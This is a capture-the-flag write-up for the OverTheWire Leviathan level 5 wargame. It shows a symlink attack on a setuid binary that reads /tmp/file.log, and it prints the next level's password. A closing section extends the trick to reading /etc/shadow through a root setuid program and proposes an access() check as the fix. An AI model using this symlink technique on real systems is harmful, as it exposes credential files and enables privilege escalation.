## Level5: leviathan5

Objective: Find the password to enter level6 **leviathan6**.

### This is how I found it:

1. In the home directory, a setuid executable **leviathan5** is present. I ran it to see what it does.

		leviathan5@leviathan:~$ ./leviathan5 
		Cannot find /tmp/file.log
		leviathan5@leviathan:~$

2. I instantly got the idea. Create a symbolic link to **/etc/leviathan_pass/leviathan6** with name **file.log** in **/tmp** directory. But wanted to confirm. So, I ran it with ltrace.

		leviathan5@leviathan:~$ ltrace ./leviathan5 
		__libc_start_main(0x56555760, 1, 0xffffd744, 0x56555840 <unfinished ...>
		fopen("/tmp/file.log", "r")                      = 0
		puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
		)                = 26
		exit(-1 <no return ...>
		+++ exited (status 255) +++
		leviathan5@leviathan:~$ 

* It is trying to open the file **/tmp/file.log** . 

3. Let us create that **symbolic link** and run **leviathan5**. 

		leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
		leviathan5@leviathan:~$ ls -l /tmp/file.log
		lrwxrwxrwx 1 leviathan5 leviathan5 30 May 31 09:20 /tmp/file.log -> /etc/leviathan_pass/leviathan6
		leviathan5@leviathan:~$ 
		leviathan5@leviathan:~$ ./leviathan5 
		UgaoFee4li
		leviathan5@leviathan:~$ 

And **GAME OVER!**

### Password for leviathan6: UgaoFee4li

-----------

**PS**:

1. The above vulnerability was a simple one to find out and exploit. But I feel it can be a very dangerous one. Consider the following scenario.

* There is an executable setuid to **root**, and just reads any file you give as input. 

* We can create symbolic links to **/etc/passwd** and **/etc/shadow**  and use that executable to read the contents. 

* The attacker can maybe bruteforce to get the password from the **hash** present in the shadow file. This will give the attacker root access.

* Even if attacker is not able to de-hash it, he can always read other sensitive information, even without any authentication.  

* How to **patch** this vulnerability: This is one method I could think about.
	
	* While coding the program / software, adding a call to **access()** will check if the **real user** has privileges to read the file or not. If **real user** does not have privileges, then the software should not display the contents of the file. 
	
	* **/etc/shadow** file can not be read by anyone except **root**. This is identified with the help of **access()** function, and vulnerability is patched.   
